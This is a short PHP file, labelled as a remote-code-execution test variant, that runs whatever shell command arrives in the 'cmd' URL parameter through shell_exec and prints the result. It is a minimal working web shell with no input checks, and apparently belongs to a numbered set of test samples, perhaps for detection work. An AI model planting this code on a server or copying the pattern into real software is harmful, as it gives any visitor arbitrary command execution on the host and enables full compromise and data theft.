<?php
// RCE test variation #117
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>